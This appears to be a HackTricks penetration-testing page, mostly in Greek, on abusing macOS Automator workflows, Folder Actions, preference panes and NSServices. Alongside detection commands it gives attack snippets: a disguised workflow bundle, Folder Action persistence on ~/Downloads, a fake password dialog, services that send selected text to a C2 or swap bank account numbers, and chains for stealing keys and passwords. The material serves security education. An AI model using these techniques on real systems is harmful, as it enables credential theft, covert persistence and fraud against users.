# Abuse of macOS Automator, Preference Panes & NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Βασικές πληροφορίες

Το **Automator** είναι το visual automation tool του macOS. Εκτελεί **workflows** (bundles `.workflow`) που αποτελούνται από **actions** (bundles `.action`). Το Automator υποστηρίζει επίσης τα **Folder Actions**, **Quick Actions** και την ενσωμάτωση με τα **Shortcuts**. Στα σύγχρονα macOS, τα workflows μπορούν επίσης να **εισαχθούν στα Shortcuts**, επομένως η ίδια κακόβουλη λογική μπορεί να εμφανιστεί ως Finder Quick Action, ως user service στο `~/Library/Services/` ή ως shortcut που βασίζεται σε legacy Automator actions.

Τα Automator actions είναι **plugins** που φορτώνονται στο Automator runtime όταν εκτελείται ένα workflow. Μπορούν να:
- Εκτελούν αυθαίρετα shell scripts
- Επεξεργάζονται αρχεία και δεδομένα
- Αλληλεπιδρούν με εφαρμογές μέσω AppleScript
- Συνδυάζονται μεταξύ τους για σύνθετο automation

### Γιατί έχει σημασία

> [!WARNING]
> Τα Automator workflows μπορούν να οδηγηθούν σε εκτέλεση μέσω **social engineering** — εμφανίζονται ως απλά αρχεία εγγράφων. Ένα bundle `.workflow` μπορεί να περιέχει ενσωματωλές shell commands που εκτελούνται όταν εκτελείται το workflow. Σε συνδυασμό με τα Folder Actions, παρέχουν **automatic persistence** που ενεργοποιείται από events αρχείων. Πρόσφατες διορθώσεις του Gatekeeper έδειξαν επίσης ότι τα **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) πρέπει να αντιμετωπίζονται ως executable content και όχι ως αβλαβή δεδομένα.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Workflow μέσω Social Engineering

Ένα bundle `.workflow` μοιάζει με ένα κανονικό αρχείο εγγράφου για τους περισσότερους χρήστες:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Τα Folder Actions εκτελούν αυτόματα ένα workflow όταν προστίθενται αρχεία σε έναν monitored folder:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Τα Folder Actions παραμένουν ενεργά μετά τις επανεκκινήσεις και εκτελούνται αθόρυβα. Ένα Folder Action στο `~/Downloads` σημαίνει ότι **κάθε ληφθέν αρχείο ενεργοποιεί το payload σας** — συμπεριλαμβανομένων αρχείων από τα Safari, Chrome, AirDrop και συνημμένων email. Σημειώστε επίσης ότι το `System Events` μπορεί να καταχωρίσει Folder Actions που δείχνουν σε scripts εκτός των προεπιλεγμένων τοποθεσιών `~/Library/Scripts/Folder Action Scripts`, γεγονός που καθιστά χρήσιμη την αναζήτηση μη αναμενόμενων paths. Για σχετικές επιπτώσεις του TCC, δείτε [τη σελίδα TCC](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Βασικές πληροφορίες

Τα preference panes (bundles `.prefPane`) είναι plugins που φορτώνονται από το **System Settings** (παλαιότερα System Preferences). Παρέχουν panels διαμόρφωσης για λειτουργίες του συστήματος ή τρίτων κατασκευαστών. Σε παλαιότερα συστήματα φορτώνονταν απευθείας από το `System Preferences`. Σε νεότερες εκδόσεις, τα preference panes τρίτων συνήθως διαχειρίζονται από μια **legacy loader XPC service** που εκκινείται από το System Settings.

### Γιατί έχει σημασία

- Τα preference panes εκτελούνται σε μια **trusted host process** που δημιουργείται από το System Settings / System Preferences
- Σε σύγχρονα συστήματα, αυτό το host μπορεί να είναι μια **`legacyLoader` XPC service**, επομένως το σημαντικό boundary παραμένει **trusted Apple UI process -> third-party code loading**
- Τα preference panes τρίτων κληρονομούν το **security context του host process** και την εμπιστοσύνη του χρήστη που συνδέεται με αυτό το UI
- Οι χρήστες εγκαθιστούν preference panes κάνοντας **διπλό κλικ** σε αυτά — κάτι που διευκολύνει το social engineering
- Μετά την εγκατάσταση, **παραμένουν** και φορτώνονται κάθε φορά που το System Settings ανοίγει σε εκείνο το panel

### Εντοπισμός
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

Ένα κακόβουλο preference pane κληρονομεί το security context του **pane host** (ιστορικά το `System Preferences`, ενώ στις νεότερες εκδόσεις συχνά ένα helper `legacyLoader` που εκκινείται από το `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Επίθεση: Persistence μέσω Εγκατάστασης
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Επίθεση: UI Phishing

Ένα preference pane μπορεί να μιμηθεί νόμιμα panels του system UI για **phish διαπιστευτήρια**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Βασικές πληροφορίες

Τα **NSServices** επιτρέπουν στις εφαρμογές να παρέχουν λειτουργικότητα σε άλλες εφαρμογές μέσω του **Services menu** (δεξί κλικ → Services). Όταν ένας χρήστης επιλέγει κείμενο ή δεδομένα και καλεί μια υπηρεσία, τα επιλεγμένα δεδομένα **αποστέλλονται στον πάροχο της υπηρεσίας** για επεξεργασία.

Οι υπηρεσίες δηλώνονται στο `Info.plist` μιας εφαρμογής, κάτω από το κλειδί `NSServices`, και καταχωρίζονται στον pasteboard server (`pbs`). Το macOS διατηρεί επίσης μια **service cache** και μια **restriction policy**, οι οποίες καθορίζουν ποιες υπηρεσίες είναι ορατές και αν οι sandboxed callers θα πρέπει να λαμβάνουν μια επιπλέον προειδοποίηση.

### Γιατί έχει σημασία

- Οι υπηρεσίες λαμβάνουν **cross-application data flow** — το επιλεγμένο κείμενο από οποιαδήποτε εφαρμογή αποστέλλεται στην υπηρεσία
- Μια κακόβουλη υπηρεσία μπορεί να υποκλέψει δεδομένα από password managers, email clients και financial apps
- Οι υπηρεσίες μπορούν να **επιστρέψουν τροποποιημένα δεδομένα** στην εφαρμογή που τις κάλεσε (man-in-the-middle σε λειτουργίες επιλογής)
- Τα ονόματα των υπηρεσιών μπορούν να διαμορφωθούν ώστε να φαίνονται νόμιμα ("Format Text", "Encrypt Selection", "Share")
- Η προαιρετική σημαία `NSRestricted` είναι σημαντική για την ασφάλεια: μια υπηρεσία που έχει επισημανθεί ως unrestricted μπορεί να κληθεί από sandboxed app χωρίς την προειδοποίηση που εμφανίζει το macOS για υπηρεσίες που μπορούν να οδηγήσουν σε escape<sup>[[2]](#references)</sup>

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Επίθεση: Υπηρεσία Υποκλοπής Δεδομένων
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attack: Data Modification (Man-in-the-Middle)

Μια υπηρεσία μπορεί να **τροποποιεί τα επιστρεφόμενα δεδομένα**, ενώ φαίνεται να παρέχει μια νόμιμη λειτουργία:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Περιορισμένες Services & Σύγχρονη Κατάχρηση

Η Apple υποστηρίζει ένα προαιρετικό boolean `NSRestricted` ανά ορισμό service. Αν έχει οριστεί, το macOS προειδοποιεί τους sandboxed callers, επειδή το service μπορεί να τους βοηθήσει να **διαφύγουν από όρια sandbox ή privacy**. Από offensive perspective, αυτό παρέχει δύο χρήσιμες διαδρομές audit:

- Αναζητήστε **third-party services που δεν έχουν επισημανθεί ως restricted**, παρότι λειτουργούν ως proxy για Apple Events, πρόσβαση σε αρχεία ή άλλες privileged ενέργειες
- Αναζητήστε **high-value built-in services** με ισχυρά entitlements (για παράδειγμα, services που εκτίθενται από το Script Editor ή helpers που βασίζονται στο Finder) και ελέγξτε αν η αλληλεπίδραση του χρήστη αρκεί για να τα μετατρέψει σε primitive πρόσβασης σε δεδομένα

Ένα καλό πρόσφατο παράδειγμα είναι το **CVE-2022-48574**, όπου ο μηχανισμός Services μπορούσε να γίνει αντικείμενο abuse για πρόσβαση σε **TCC-protected αρχεία χρηστών χωρίς την αναμενόμενη ροή επιβεβαίωσης**. Το bug έχει διορθωθεί, όμως η τεχνική παραμένει χρήσιμη για threat modeling: κάθε service που προωθεί αιτήματα πρόσβασης σε αρχεία ή automation εκ μέρους του caller απαιτεί τον ίδιο έλεγχο.<sup>[[2]](#references)</sup>

---

## Πρόσφατες Σημειώσεις Ασφάλειας

- **Τα Quick Actions είναι executable content**: Η Apple διόρθωσε το 2024 ένα Gatekeeper bypass, όπου ένα Automator Quick Action ενσωματωμένο σε app μπορούσε να εκτελεστεί χωρίς το κανονικό assessment. Κατά τον έλεγχο apps, εξετάστε το `Contents/PlugIns/*.workflow/Contents/document.wflow` ακριβώς όπως θα εξετάζατε helper scripts ή login items. Δείτε [τη σελίδα Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Τα Shortcuts μπορούν να κληρονομήσουν legacy συμπεριφορά του Automator**: Η Apple πρόσθεσε επίσης ένα πρόσθετο prompt συναίνεσης χρήστη, αφού εντοπίστηκε ότι third-party shortcuts χρησιμοποιούσαν ένα **legacy Automator action** για την αποστολή Apple Events χωρίς την αναμενόμενη ροή permissions. Τα imported workflows και τα shortcut bundles θα πρέπει να ελέγχονται για `Run AppleScript`, `Run Shell Script` και παρόμοια bridge actions. Δείτε [τη σελίδα TCC](../macos-security-protections/macos-tcc/README.md).<sup>[[3]](#references)</sup>
- **Το Automator παραμένει ενεργό privacy boundary**: Η Apple διέθεσε άλλη μία διόρθωση για το Automator το 2025, σχετικά με την πρόσβαση σε προστατευμένα δεδομένα χρηστών. Ακόμη κι αν το Automator είναι legacy surface, αντιμετωπίστε κάθε workflow runner, Quick Action host ή automation bridge ως τρέχον attack surface και όχι ως dead code.<sup>[[4]](#references)</sup>

---

## Αλυσίδες Επιθέσεων μεταξύ Τεχνικών

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Πίνακας Προτιμήσεων → Κλιμάκωση TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Κλοπή από Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Αναφορές

- [1] [Apple — Σχετικά με το περιεχόμενο ασφαλείας των macOS Ventura 13.7, Sonoma 14.7 και Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Πώς λειτουργούσε το NSServices exploit στο macOS](https://moonlock.com/nsservices-macos)
- [3] [Apple — Σχετικά με το περιεχόμενο ασφαλείας του macOS Sonoma 14.6 (CVE-2024-40834)](https://support.apple.com/en-us/120911)
- [4] [Apple — Σχετικά με το περιεχόμενο ασφαλείας του macOS Sequoia 15.4 (CVE-2025-30460)](https://support.apple.com/en-us/122373)

{{#include ../../../banners/hacktricks-training.md}}
